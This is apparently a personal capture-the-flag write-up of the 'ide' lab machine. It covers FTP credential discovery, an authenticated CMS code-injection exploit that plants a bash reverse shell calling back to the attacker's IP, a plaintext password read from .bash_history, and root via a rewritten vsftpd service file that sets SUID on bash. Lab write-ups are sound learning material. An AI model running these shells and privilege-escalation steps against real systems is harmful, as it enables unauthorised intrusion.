![[Pasted image 20251104141414.png]]
first i started to inspect the ip and there was a apache default webpage running and i inspected it and red the source code for anything intresting and hidden and nothing was present there so i moved on to scan the open ports and its services to gain more overall attack surface

![[Pasted image 20251104141627.png|500]]
we see we have a ssh and ftp and a another webpage running on 62337 and i took a view into it and we had a normal webpage asking for username and password and i started to look for intresting directories for some valuable info

![[Pasted image 20251104152139.png|600]]

i found a few intresting directories like plugins,data, and much more but nothing really worked
![[Pasted image 20251104152420.png|500]]
![[Pasted image 20251104152556.png|500]]
![[Pasted image 20251104152110.png|600]]
 then i started to inspect into the ftp which i complelety forgot and i saw this 
we got the username and password so i logged on with it
![[Pasted image 20251104152244.png]]
![[Pasted image 20251104154340.png]]
i resarched a bit about the cms and i found out there exists a vulnerablity ie code injection within our verison of the cms running but it needs to be authenticated
but we also got the username and password

![[Pasted image 20251104175756.png|400]]


after ive logged in we can now run the script which injects a bash rev shell into the live running webpage so when it runs we will get a reverse connection!

![[Pasted image 20251104154450.png|500]]

violah we got the connection

```bash
fahad@Workstation:~/tools$ python3 49705.py http://10.201.46.22:62337/ john password 10.8.131.57 4444 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.8.131.57/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"df","path":"asfsafs"}}
[+] Writeable Path : asfsafs
[+] Sending payload...
{"status":"error","message":"No Results Returned"}
[+] Exploit finished!

```
after going into the home directorty i catted the bash history and got the username and passwords plainly 

```bash
www-data@ide:/home/drac$ cat .bash_history
cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

then i logged in and i found out the user can execute vsftpd commands as root with no thinking i edited the .service file and made bash executable 
```
drac@ide:~$ sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart


```

we edited the service file and now restarted the vsftpd service and ran bash -p and violah we got the root
```bash
drac@ide:~$ nano /lib/systemd/system/vsftpd.service
drac@ide:~$ sudo service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ sudo service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.
drac@ide:~$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
drac@ide:~$ sudo service vsftpd restart
drac@ide:~$ /tmp/rootbash -p
-bash: /tmp/rootbash: No such file or directory
drac@ide:~$ cat /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
drac@ide:~$ bash -p
bash-4.4# cat /root/root.txt
ce258cb16f47f1c--------------
bash-4.4# 
```